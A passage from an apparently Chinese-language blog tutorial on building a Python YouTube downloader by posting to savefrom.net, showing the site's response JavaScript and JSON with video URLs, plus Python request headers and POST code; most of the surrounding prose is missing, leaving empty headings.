class="property">sf</span>.<span class="title function_">enableElement</span>(<span class="string">&#x27;sf_submit&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">success=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(err)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">del</span>();</span><br><span class="line"><span class="keyword">if</span>(!success)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> alt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(alt) <span class="title function_">alert</span>(alt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> navigator.<span class="property">permissions</span> != <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">navigator.<span class="property">permissions</span>.<span class="title function_">query</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;notifications&#x27;</span>&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">permissionStatus</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title class_">Notification</span>.<span class="property">permission</span> === <span class="string">&#x27;denied&#x27;</span> &amp;&amp; permissionStatus.<span class="property">state</span> === <span class="string">&#x27;prompt&#x27;</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">showResult</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">showResult</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="title function_">showResult</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><code>del()</code><br><code>window.location.hostname.search(/(?:^|\.|@)(savefrom\.net|sfrom\.net|savefrom\.com\.au|51\.159\.57\.158|(?:fe\d*|test)-front\.sf-apps\.com)$/i) == -1</code><code>del()</code><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">sf</span>.<span class="property">videoResult</span>.<span class="title function_">show</span>(&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;YPvtz1lHRiw&quot;</span>,<span class="string">&quot;cipher&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;meta&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;The Most Genius Plays in Football&quot;</span>,<span class="string">&quot;source&quot;</span>:<span class="string">&quot;https:\/\/www.youtube.com\/watch?v=YPvtz1lHRiw&quot;</span>,<span class="string">&quot;duration&quot;</span>:<span class="string">&quot;7:03&quot;</span>,<span class="string">&quot;tags&quot;</span>:<span class="string">&quot;lionel messi,football tiki taka,football highlight,football team plays,kevin de bruyne,mesut \u00f6zil,paul pogba,cristiano ronaldo,adama traore,luka modric,toni kroos,andres iniesta,kylian mbappe,neymar jr,zlatan ibrahimovic,franck ribery,paulo dybala,philippe coutinho,robert lewandowski,barcelona,real madrid,liverpool,manchester city&quot;</span>&#125;,<span class="string">&quot;thumb&quot;</span>:<span class="string">&quot;https:\/\/i.ytimg.com\/vi\/YPvtz1lHRiw\/hqdefault.jpg&quot;</span>,<span class="string">&quot;itags&quot;</span>:[<span class="string">&quot;18&quot;</span>,<span class="string">&quot;22&quot;</span>,<span class="string">&quot;133&quot;</span>,<span class="string">&quot;134&quot;</span>,<span class="string">&quot;135&quot;</span>,<span class="string">&quot;136&quot;</span>,<span class="string">&quot;137&quot;</span>,<span class="string">&quot;140&quot;</span>,<span class="string">&quot;160&quot;</span>,<span class="string">&quot;242&quot;</span>,<span class="string">&quot;243&quot;</span>,<span class="string">&quot;244&quot;</span>,<span class="string">&quot;247&quot;</span>,<span class="string">&quot;248&quot;</span>,<span class="string">&quot;249&quot;</span>,<span class="string">&quot;250&quot;</span>,<span class="string">&quot;251&quot;</span>,<span class="string">&quot;278&quot;</span>],<span class="string">&quot;video_quality&quot;</span>:[<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;720&quot;</span>,<span class="string">&quot;480&quot;</span>,<span class="string">&quot;360&quot;</span>,<span class="string">&quot;240&quot;</span>,<span class="string">&quot;144&quot;</span>],<span class="string">&quot;url&quot;</span>:[&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;18&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">35202709</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 360&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;0c41b67f74ccb97e50f2e64fe5f4625a&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&amp;title=The%20Most%20Genius%20Plays%20in%20Football&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;22&quot;</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 720&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;674fa89ee246148990b3f36e750a5d32&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4 dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;137&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">177708494</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;6816215e43020185bb429874c33f1f73&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;WEBM&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;webm dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;webm&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;248&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">117037047</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;43e803aa40437c9930975615121cc2c5&quot;</span>&#125;],<span class="string">&quot;hosting&quot;</span>:<span class="number">101</span>,<span class="string">&quot;srv&quot;</span>:<span class="string">&quot;s30&quot;</span>,<span class="string">&quot;sd&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;hd&quot;</span>:<span class="literal">null</span>&#125;);;</span><br></pre></td></tr></table></figure><p>jsonjson(<a href="http://www.bejson.com/jsonviewernew/">bejson</a>)json<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-11.png" alt="json"><br><code>meta</code><code>url</code></p><blockquote><p>+100github</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://github.com/Nambers/YoutubeDownloader">github</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="1-post"><a href="#1-post" class="headerlink" title="1. post"></a>1. post</h3><p><code>post</code>js<code>requests</code><a href="https://blog.csdn.net/qq_40832960/article/details/103854145"></a></p><h4 id="i-postheaders"><a href="#i-postheaders" class="headerlink" title="i. postheaders"></a>i. postheaders</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the headers or the website will not return information</span></span><br><span class="line">    <span class="comment"># the cookies in here you may need to change</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&quot;</span></span><br><span class="line">                  <span class="string">&quot;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; &quot;</span></span><br><span class="line">                  <span class="string">&quot;clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; &quot;</span></span><br><span class="line">                  <span class="string">&quot;helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; &quot;</span></span><br><span class="line">                  <span class="string">&quot;_ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSID=030393eb0776d20d0975f99b523a70d4; x-requested-with=; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSUD=islilfjn5alth33j9j8glj9776; _gat_helperWidget=1; _gat_inpagePush2=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://en.savefrom.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://en.savefrom.net/1-youtube-video-downloader-4/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;87\&quot;, \&quot;Not;A Brand\&quot;;v=\&quot;99\&quot;,\&quot;Chromium\&quot;;v=\&quot;87\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;iframe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-user&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;upgrade-insecure-requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/87.0.4280.88 Safari/537.36&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><code>cookie</code></p><h4 id="ii-"><a href="#ii-" class="headerlink" title="ii."></a>ii.</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the parameter, we can get from chrome</span></span><br><span class="line">    kv = &#123;<span class="string">&quot;sf_url&quot;</span>: url,</span><br><span class="line">          <span class="string">&quot;sf_submit&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;new&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;country&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">          <span class="string">&quot;os&quot;</span>: <span class="string">&quot;Windows&quot;</span>,</span><br><span class="line">          <span class="string">&quot;browser&quot;</span>: <span class="string">&quot;Chrome&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><code>sf_url</code>youtubeurl</p><h4 id="iii-requestspost"><a href="#iii-requestspost" class="headerlink" title="iii. requestspost"></a>iii. <code>requests</code>post</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># do the POST request</span></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;https://en.savefrom.net/savefrom.php&quot;</span>, headers=headers,</span><br><span class="line">                      data=kv)</span><br><span class="line">    r.raise_for_status()</span><br></pre></td></tr></table></figure><p><code>data=kv</code></p><h4 id="iv-"><a href="#iv-" class="headerlink" title="iv. "></a>iv. </h4><figure class="highlight python"><table><tr><td 